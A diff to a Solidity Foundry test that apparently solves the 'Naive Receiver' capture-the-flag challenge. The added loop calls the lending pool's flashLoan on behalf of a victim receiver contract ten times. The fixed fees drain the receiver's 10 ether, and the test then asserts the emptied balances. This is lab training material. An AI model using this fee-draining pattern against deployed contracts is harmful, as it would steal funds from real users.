@@ -20,12 +20,17 @@ contract NaiveReceiverTest is DSTest {
         naiveReceiverLenderPool = new NaiveReceiverLenderPool();
         flashLoanReceiver = new FlashLoanReceiver(payable(address(naiveReceiverLenderPool)));
         
-        vm.deal(payable(address(naiveReceiverLenderPool)), 1000);
-        vm.deal(payable(address(flashLoanReceiver)), 10);
+        vm.deal(payable(address(naiveReceiverLenderPool)), 1000 ether);
+        vm.deal(payable(address(flashLoanReceiver)), 10 ether);
     }
 
     function testNaiveReceiver() public {
+        for (uint8 i = 9; i > 0; i--) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), i * (1 ether));
+        }
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        emit log_int(int256(address(flashLoanReceiver).balance));
         require(address(flashLoanReceiver).balance == 0, "Receiver balance should be 0.");
-        require(address(naiveReceiverLenderPool).balance == 1010, "Pool balance should be 1010.");
+        require(address(naiveReceiverLenderPool).balance == 1010 ether, "Pool balance should be 1010.");
     }
 }
